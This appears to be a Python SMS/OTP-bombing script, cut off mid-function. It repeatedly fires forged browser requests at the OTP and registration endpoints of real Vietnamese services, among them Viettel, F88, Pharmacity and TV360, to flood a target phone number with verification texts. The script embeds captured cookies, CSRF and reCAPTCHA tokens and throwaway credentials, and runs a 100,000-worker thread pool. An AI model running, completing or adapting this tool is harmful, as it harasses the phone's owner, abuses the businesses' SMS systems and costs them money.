import requests,sys,time,json
from concurrent.futures import ThreadPoolExecutor
# cau hinh lay tt
threading = ThreadPoolExecutor(max_workers=int(100000))
sdt = sys.argv[1]
amount = int(sys.argv[2])

#phamacy
def phamacy(sdt):
  headers = {
      'Host': 'api-gateway.pharmacity.vn',
      # 'content-length': '36',
      'user-agent':
      'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
      'content-type': 'application/json',
      'accept': '*/*',
      'origin': 'https://www.pharmacity.vn',
      'x-requested-with': 'mark.via.gp',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://www.pharmacity.vn/',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"sdt","referral":""}'.replace("sdt", sdt)
  response = requests.post(
      'https://api-gateway.pharmacity.vn/customers/register/otp',
      data=data,
      headers=headers)
#GOSELL.VN
def beecow(sdt):
  headers = {
      'Host': 'api.beecow.com',
      # 'content-length': '138',
      'content-type': 'application/json; text/plain',
      'accept': 'application/json, text/plain, application/stream+json',
      'ati': '1467350218617',
      'platform': 'WEB',
      'user-agent':
      'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
      'time-zone': 'Asia/Saigon',
      'origin': 'https://admin.gosell.vn',
      'x-requested-with': 'mark.via.gp',
      'sec-fetch-site': 'cross-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://admin.gosell.vn/',
      # 'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"password":"12345ccok@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"sdt"}}'.replace(
      'sdt', sdt)
  response = requests.post('https://api.beecow.com/api/register/gosell',
                           headers=headers,
                           data=data).text
#ThePizzaCo.      
def pizzacompany(sdt):
  cookies = {
      '_gcl_au':
      '1.1.607819339.1691276885',
      '_ga':
      'GA1.2.453948248.1691276886',
      '_gid':
      'GA1.2.698696022.1691276886',
      '_tt_enable_cookie':
      '1',
      '_ttp':
      'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
      '_fbp':
      'fb.1.1691276888170.1960321660',
      '.Nop.Antiforgery':
      'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
      '.Nop.Customer':
      'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
      '.Nop.TempData':
      'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  headers = {
      'Host': 'thepizzacompany.vn',
      # 'content-length': '199',
      'accept': '*/*',
      'x-requested-with': 'XMLHttpRequest',
      'user-agent':
      'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://thepizzacompany.vn',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://thepizzacompany.vn/Otp',
      # 'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  data = {
      'phone':
      f'{sdt}',
      '__RequestVerificationToken':
      'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
  }
  response = requests.post('https://thepizzacompany.vn/customer/ResendOtp',
                           cookies=cookies,
                           headers=headers,
                           data=data).json()
# GHN
def ghn(sdt):
  headers = {
      'Host': 'online-gateway.ghn.vn',
      # 'content-length': '40',
      'accept': 'application/json, text/plain, */*',
      'user-agent':
      'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
      'content-type': 'application/json',
      'origin': 'https://sso.ghn.vn',
      'x-requested-with': 'mark.via.gp',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://sso.ghn.vn/',
      # 'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"sdt","type":"register"}'.replace("sdt", sdt)
  response = requests.post(
      'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
      headers=headers,
      data=data).json()
#BEST_INC
def best_inc(sdt):
  headers = {
      'Host': 'v9-cc.800best.com',
      'Connection': 'keep-alive',
      # 'Content-Length': '53',
      'x-timezone-offset': '7',
      'x-auth-type': 'web-app',
      'x-nat': 'vi-VN',
      'x-lan': 'VI',
      'authorization': 'null',
      'User-Agent':
      'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
      'content-type': 'application/json',
      'accept': 'application/json',
      'lang-type': 'vi-VN',
      'Origin': 'https://best-inc.vn',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://best-inc.vn/',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt", sdt)
  response = requests.post(
      'https://v9-cc.800best.com/uc/account/sendsignupcode',
      data=data,
      headers=headers).text
#APPOTA
def appota(sdt):
  headers = {
      'Host': 'vi.appota.com',
      # 'content-length': '23',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'x-requested-with': 'XMLHttpRequest',
      'user-agent':
      'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://vi.appota.com',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://vi.appota.com/',
      # 'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVkaTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
  }
  data = {
      'phone_number': f'{sdt}',
  }
  response = requests.post('https://vi.appota.com/check-phone-register.html',
                           data=data,
                           headers=headers).text
#FPTSHOP
def fpt1(phone):
  requests.post(
      "https://fptshop.com.vn/api-data/loyalty/Home/Verification",
      headers={
          "Host": "fptshop.com.vn",
          "content-length": "16",
          "accept": "*/*",
          "content-type":
          "application/x-www-form-urlencoded; charset\u003dUTF-8",
          "x-requested-with": "XMLHttpRequest",
          "sec-ch-ua-mobile": "?1",
          "user-agent":
          "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
          "sec-ch-ua-platform": "\"Linux\"",
          "origin": "https://fptshop.com.vn",
          "sec-fetch-site": "same-origin",
          "sec-fetch-mode": "cors",
          "sec-fetch-dest": "empty",
          "referer": "https://fptshop.com.vn/",
          "accept-encoding": "gzip, deflate, br"
      },
      data={
          "phone": sdt
      }).text
#Ahamove
def ahamove(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
#fpt1
def fpt2(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
#viettel1
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)    

#viettel2
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
#phuclong1
def PHUCLONG1(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
  
    data = {
        "phoneNumber": sdt,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', data=datason, headers=headers)

#phuclong2    
def PHUCLONG2(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
  
    data = {
        "phoneNumber": sdt,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', data=datason, headers=headers)
#f88 1
def F881(sdt):
    head = [
        'Host: api.f88.vn',
        'accept: application/json, text/plain, */*',
        'content-encoding: gzip',
        'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
        'content-type: application/json',
        'origin: https://online.f88.vn',
        'referer: https://online.f88.vn/',
    ]
    data = '{"phoneNumber":"' + sdt + '","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}'
    access = json(CURL("POST", "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", data, head, False))    
#f88 2
def F882(sdt):
    headers = {
        "Host": "api.f88.vn",
        "accept": "application/json, text/plain, */*",
        "content-encoding": "gzip",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://online.f88.vn",
        "referer": "https://online.f88.vn/",
    }
    data = {
        "phoneNumber": sdt,
        "recaptchaResponse": "03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO",
        "source": "Online"
    }
    response = requests.post("https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", json=data, headers=headers)
#f88 3
def F883(sdt):
    requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":"0"+phone[1:11],"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text                                 
#tv360
def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#tv360 2
def TV360(sdt):
    url = "http://m.tv360.vn/public/v1/auth/get-otp-login"
    headers = {
        "Host": "m.tv360.vn",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "http://m.tv360.vn",
        "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
        "Cookie": "img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
    }
    data = {"msisdn": sdt}

    response = requests.post(url, headers=headers, data=json.dumps(data))
    access = response.json()
#tv360 3
def tv360(phone):
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
#vieon1
def vieon(sdt):
  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
